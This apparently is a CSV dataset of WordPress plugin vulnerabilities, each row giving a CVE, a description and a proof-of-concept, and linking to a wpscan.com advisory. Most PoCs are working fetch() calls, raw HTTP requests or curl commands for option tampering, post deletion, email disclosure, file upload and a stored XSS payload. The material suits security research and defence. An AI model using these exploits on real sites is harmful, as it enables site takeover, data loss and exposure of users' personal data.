id,plugin_name,vulnerable_version,vulnerability_name,description,cve,poc,url
17,zoho-crm-forms,< 1.7.6.2,Subscriber+ Arbitrary Options Update,"The plugin does not have authorisation and CSRF in some AJAX actions, and does not ensure that the option to be updated belong to the plugin. As a result, any authenticated users, such as subscriber could update arbitrary blog options (such as default_role and users_can_register).",CVE-2022-41978,"v < 1.7.6.1

https://example.com/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce=&tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber

https://example.com/wp-admin/admin-ajax.php?action= mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings&shortcode=blogname&thirdparty_title=Owned

v <= 1.7.6.1

Run one of the below command in the developer console of the web browser while being on the blog as a subscriber user and one of the backend page (such as the profile)

fetch(""/wp-admin/admin-ajax.php?action=zcf_save_contact_form_title&nonce="", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'tp_title_key=blogname&tp_title_val=Changed%20by%20Subscriber',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));

fetch(""/wp-admin/admin-ajax.php?action=mainActionscrmForms&operation=NoFieldOperation&doaction=SaveFormSettings"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
    ""X-CSRF-TOKEN"": jQuery(""[name='zoho_crm_forms_csrf_token']"").attr(""content"")
  },
  ""method"": ""POST"",
  ""body"": 'shortcode=blogname&thirdparty_title=Owned',
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/e4102b5d-079a-4a3a-af2a-c2f712ac1cd7/
18,wp-hotel-booking,< 2.0.8,Subscriber+ Arbitrary Post Deletion,"The plugin does not have authorisation and CSRF checks, as well as does not ensure that the package to be deleted is a package, allowing any authenticated users, such as subscriber to delete arbitrary posts",CVE-2023-5651,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user. This will put the post with ID 1 in the trash. Run it again to then delete the post

fetch(""/wp-admin/admin-ajax.php"", {""headers"": {""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8""},""body"": 'action=tp_extra_package_remove&package_id=1',""method"": ""POST""});",https://wpscan.com/vulnerability/a365c050-96ae-4266-aa87-850ee259ee2c/
19,insight-core,<= 1.0,Subscriber+ PHP Object Injection & Stored XSS,"The plugin does not have any authorisation and CSRF checks in the insight_customizer_options_import (available to any authenticated user), does not validate user input before passing it to unserialize(), nor sanitise and escape it before outputting it in the response. As a result, it could allow users with a role as low as Subscriber to perform PHP Object Injection, as well as Stored Cross-Site Scripting attacks",CVE-2021-24950,"let formData = new FormData;
formData.append('import-file', new Blob(['a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}']))
formData.append('action', 'insight_customizer_options_import');
fetch(""https://example.com/wp-admin/admin-ajax.php"", {
  ""body"": formData,
  ""method"": ""POST""
})
  .then(response => response.text())
  .then(data => console.log(data));

POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------189498983625966260651015514771
Content-Length: 458
Connection: close
Cookie: [any authenticated user]

-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""import-file""; filename=""blob""
Content-Type: application/octet-stream

a:1:{s:16:""background_color"";s:34:""</style><script>alert(/XSS/);</script>"";}
-----------------------------189498983625966260651015514771
Content-Disposition: form-data; name=""action""

insight_customizer_options_import
-----------------------------189498983625966260651015514771--


The XSS will be triggered in all frontend pages",https://wpscan.com/vulnerability/01d430ea-ef85-4529-9ae4-c1f70016bb75/
20,profile-builder,< 3.9.8,Unauthenticated Plugin's Pages Creation,"The plugin lacks authorisation and CSRF in its page creation function which allows unauthenticated users to create the register, log-in and edit-profile pages from the plugin on the blog",CVE-2023-4059,"1. Access the URL: https://example.com/wp-admin/admin-post.php?page=profile-builder-basic-info&wppb_create_pages=true&wppb_force_create_pages=true 
2. As a logged in user, see that the pages `/register`, `/log-in`, and `/edit-profile` have been created.",https://wpscan.com/vulnerability/fc719d12-2f58-4d1f-b696-0f937e706842/
21,mycred,< 2.4.4.1,Subscriber+ User E-mail Addresses Disclosure,"The plugin does not have any authorisation in place in its mycred-tools-select-user AJAX action, allowing any authenticated user, such as subscriber to call and retrieve all email addresses from the blog",CVE-2022-0287,https://example.com/wp-admin/admin-ajax.php?action=mycred-tools-select-user,https://wpscan.com/vulnerability/6cd7cd6d-1cc1-472c-809b-b66389f149b0/
22,wp-gdpr-compliance,< 2.0.23,Subscriber+ Arbitrary Options Update,"The plugin is vulnerable to arbitrary option updates due to a missing capability check on its AJAX request handler, allowing any authenticated users, such as subscriber to update arbitrary site options",CVE-2023-6700,"Run the below command in the developer console of the web browser while being on the blog as subscriber user to set the users_can_register option to true.

fetch(""/wp-admin/admin-ajax.php"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
  },
  ""method"": ""POST"",
  ""body"": 'action=wpgdprc_update_integration&data={""name"":""users_can_register"",""value"":true,""type"":""yolo""}&security=' + wpgdprcAdmin['ajaxNonce'],
  ""credentials"": ""include""
}).then(response => response.text())
  .then(data => console.log(data));",https://wpscan.com/vulnerability/0c207e0a-f52d-4a59-a7b1-94e4a19b45f6/
23,profile-builder,< 3.11.8,Unauthenticated Media Upload,"The plugin does not have proper authorisation, allowing unauthenticated users to upload media files via the async upload functionality of WP.",CVE-2024-6366,"curl -vvvv -X POST -F 'wppb_upload=true' \
     -F 'meta_name=test.jpg' \
     -F '_wpnonce=e8' \
     -F 'action=upload-attachment' \
     -F 'async-upload=@test.jpg' \
     https://example.com/wp-admin/async-upload.php",https://wpscan.com/vulnerability/5b90cbdd-52cc-4e7b-bf39-bea0dd59e19e/
24,eazydocs,< 2.3.6,Subscriber+ Arbitrary Posts Deletion and Document Management,"The plugin does not have authorization and CSRF checks when handling documents and does not ensure that they are documents from the plugin, allowing any authenticated users, such as subscriber to delete arbitrary posts, as well as add and delete documents/sections.",CVE-2023-6029,"1. Install the EazyDocs plugin
2. Log in as Subscriber
3. Make GET requests:
- To add a document : https://example.com/wp-admin/admin-post.php?Create_doc=yes&parent_title=doc%201
- To delete a post/document : https://example.com/wp-admin/admin-post.php?Doc_Delete=yes&DeleteID=12
- To add a section : https://example.com/wp-admin/admin-post.php?Create_Section=yes&parentID=90&is_section=sec%201
- To delete a section: https://example.com/wp-admin/admin-post.php?Section_Delete=yes&ID=110

When making requests, the page will redirect to the login page but the action is still completed, log in as Admin to check the result.",https://wpscan.com/vulnerability/7a0aaf85-8130-4fd7-8f09-f8edc929597e/
25,estatik,< 4.1.1,Subscriber+ Arbitrary Option Update,"The plugin does not prevent user with low privileges on the site, like subscribers, from setting any of the site's options to 1, which could be used to break sites and lead to DoS when certain options are reset",CVE-2023-6048,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user:

fetch(""/wp-admin/admin-ajax.php?action=es_dismiss_notices"", {
  ""headers"": {
    ""content-type"": ""application/x-www-form-urlencoded"",
   },
  ""body"": ""notice=template"",
  ""method"": ""POST"",
});",https://wpscan.com/vulnerability/74cb07fe-fc82-472f-8c52-859c176d9e51/
26,fatal-error-notify,< 1.5.3,Subscriber+ Test Error Email Sending,"The plugin does not have authorisation and CSRF checks in its test_error AJAX action, allowing any authenticated users, such as subscriber to call it and spam the admin email address with error messages. The issue is also exploitable via CSRF",CVE-2023-7202,"As a subscriber, open https://example.com/wp-admin/admin-ajax.php?action=test_error

The attack can also be performed via CSRF by making a logged in user open the link above",https://wpscan.com/vulnerability/d923ba5b-1c20-40ee-ac69-cd0bb65b375a/
27,directorist,< 7.4.4,Subscriber+ Sensitive Information Disclosure,The plugin does not prevent users with low privileges (like subscribers) from accessing sensitive system information.,CVE-2022-3961,"fetch('http://wpscan.local/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=send_system_info',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));

fetch('https://wpscan.local/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=generate_url',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));

Then we get the secret url for system info",https://wpscan.com/vulnerability/6aad6454-de1b-4304-9c14-05e28d08b253/
28,enjoy-instagram-instagram-responsive-images-gallery-and-carousel,<= 6.2.2,Unauthenticated Arbitrary Instagram Account Unlinking,"The plugin does not have authorisation and CSRF in various function hooked to admin_init, allowing unauthenticated users to call them and unlink arbitrary users Instagram Account for example",CVE-2024-0779,"As unauthenticated, open the following URL to unlink the Instagram account of the user with ID 5:

https://example.com/wp-admin/admin-post.php?action=enjoyinstagram-remove-user&user_id=5&tab=users-settings",https://wpscan.com/vulnerability/ced134cf-82c5-401b-9476-b6456e1924e2/
29,image-hover-effects-ultimate,< 9.7.0,Unauthenticated Arbitrary Option Update,"The plugin does not have any authorisation in its REST API endpoint, one of them could allow unauthenticated attackers to update arbitrary blog options.",CVE-2021-36888,"POST /wp-json/ImageHoverUltimate/v1/oxi_settings HTTP/1.1
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 69
Connection: close

rawdata=%7B%22name%22%3A%22blogname%22%2C%22value%22%3A%22Owned%22%7D",https://wpscan.com/vulnerability/75da4102-7063-407f-975e-28be6ed33aac/
30,wooswipe,< 3.0.0,Subscriber+ Settings Update,"The plugin does not have any authorisation when updating its settings, which could allow any authenticated users, such as subscriber to update them",CVE-2022-45066,"POST /wp-admin/admin.php?page=wooswipe-options HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------1848431393440185984976916911
Content-Length: 565
Connection: close
Cookie: [subscriber+]
Upgrade-Insecure-Requests: 1

-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""white_theme""

checkbox
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""icon_bg_color""

#000000
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""icon_stroke_color""

#ffffff
-----------------------------1848431393440185984976916911
Content-Disposition: form-data; name=""wooswipe_save""

Save Changes
-----------------------------1848431393440185984976916911--


Even though the response will be a 403, the settings will be updated",https://wpscan.com/vulnerability/9d1ffb6f-174d-4391-a141-bd7532035aa4/
31,mycred,< 2.4.4,Subscriber+ Import/Export to Email Address Disclosure,"The plugin does not have authorisation and CSRF checks in its mycred-tools-import-export AJAX action, allowing any authenticated user to call and and retrieve the list of email address present in the blog",CVE-2022-1092,"POST /wp-admin/admin-ajax.php HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 130
Cookie: [any authenticated user]

action=mycred-tools-import-export&request_tab=points&request=export&template=raw&user_field=email&types=%5B%22mycred_default%22%5D",https://wpscan.com/vulnerability/95759d5c-8802-4493-b7e5-7f2bc546af61/
32,smart-forms,< 2.6.94,Subscriber+ Edit Entries via Broken Access Control,"The plugin does not have proper authorization in some actions, which could allow users with a role as low as a subscriber to call them and perform unauthorized actions",CVE-2024-1307,"While logged as a subscriber, paste the following in your browser's console:

fetch('/wp-admin/admin-ajax.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: new URLSearchParams({
        'action': 'rednao_smart_forms_edit_form_values',
        'entryId': '7',
        'entryString': '{""rnField1"":{""value"":""Mr Hacker""},""rnField2"":{""value"":""mehdi@mtest.com""},""rnField3"":{""value"":""SUCCESSFUL FIELD HACK""}}',
        'elementOptions': JSON.stringify([{""_id"":35,""ClassName"":""rednaotextinput"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""35"",""Type"":""single""},""Id"":""rnField1"",""Spacing"":""col-sm-12"",""Label"":""Name"",""Placeholder"":"""",""Value"":"""",""ReadOnly"":""n"",""Width"":"""",""Icon"":{""ClassName"":""""},""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""_Selected"":true},{""_id"":36,""ClassName"":""rednaoemail"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""37"",""Type"":""single""},""Id"":""rnField2"",""Spacing"":""col-sm-12"",""Label"":""Email"",""Placeholder"":"""",""Icon"":{""ClassName"":""""},""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""Value"":"""",""ReadOnly"":""n"",""_Selected"":true},{""_id"":37,""ClassName"":""rednaotextarea"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""39"",""Type"":""single""},""Id"":""rnField3"",""Spacing"":""col-sm-12"",""Label"":""Message"",""DefaultText"":"""",""Value"":"""",""Width"":"""",""Height"":"""",""Placeholder"":"""",""Disabled"":""n"",""MaxLength"":"""",""CustomCSS"":"""",""Placeholder_Icon"":{""ClassName"":"""",""Orientation"":""""},""_Selected"":true},{""_id"":38,""ClassName"":""rednaosubmissionbutton"",""IsRequired"":""n"",""Formulas"":{},""Styles"":{},""ContainerOptions"":{""Width"":-1,""Id"":""41"",""Type"":""single""},""Id"":""rnField4"",""Spacing"":""col-sm-12"",""ButtonText"":""Send"",""CustomCSS"":"""",""Icon"":{""ClassName"":""glyphicon glyphicon-send"",""Orientation"":""Add""},""Animated"":""y"",""Action"":""submit"",""_Selected"":true}])
    })
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));",https://wpscan.com/vulnerability/bbc6cebd-e9bf-4b08-a474-f9312b3c0947/
33,wp-shamsi,<= 4.3.3,Subscriber+ Attachment Deletion,The plugin has CSRF and broken access control vulnerabilities which leads user with role as low as subscriber delete attachment.,CVE-2023-0335,"Exploit (#1 attachment id delete):

fetch('http://localhost/wp-admin/admin-ajax.php', {
        method: 'POST',
        headers: new Headers({
            'Content-Type': 'application/x-www-form-urlencoded',
        }),
        body: 'action=exopite-sof-file-batch-delete&media-ids%5B%5D=1&media-ids%5B%5D=1',
        redirect: 'follow'
    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/f7a20bea-c3d5-431b-bdcf-e189c81a561a/
